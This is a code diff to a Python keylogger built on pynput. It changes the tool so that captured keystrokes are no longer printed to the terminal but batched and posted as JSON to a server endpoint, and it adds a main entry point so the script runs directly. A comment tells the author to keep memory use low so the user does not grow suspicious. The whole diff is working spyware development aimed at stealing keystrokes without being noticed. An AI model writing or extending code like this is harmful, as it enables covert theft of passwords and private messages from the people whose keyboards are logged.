@@ -1,12 +1,12 @@
 from typing import List, Final, Dict, Optional, Union
 import json
-
+import requests
 from pynput import keyboard  # type: ignore
 from pynput.keyboard import Key, KeyCode  # type: ignore
 
 # Maximum number of keys to save, keep low to avoid memory issues
 # that could warrant concern from user
-SAVED_KEYS_LIMIT: Final[int] = 1024
+SAVED_KEYS_LIMIT: Final[int] = 64
 
 
 class Keylogger:
@@ -43,10 +43,8 @@ class Keylogger:
                 self._keys_pressed.append(key.name)
 
         if len(self._keys_pressed) >= SAVED_KEYS_LIMIT:
-            # TODO: make network call to server
-            #
-            # Proof of concept: print to terminal
-            print(self._to_json())
+            url = "http://127.0.0.1:5000/keylogger/send_data"
+            response: dict = requests.post(url, json=self._to_json())
             self._keys_pressed.clear()
 
     def _to_json(self) -> str:
@@ -71,3 +69,7 @@ def start_logger():
     keylogger = Keylogger()
     with keyboard.Listener(on_press=keylogger.log_key) as listener:
         listener.join()
+
+
+if __name__ == "__main__":
+    start_logger()
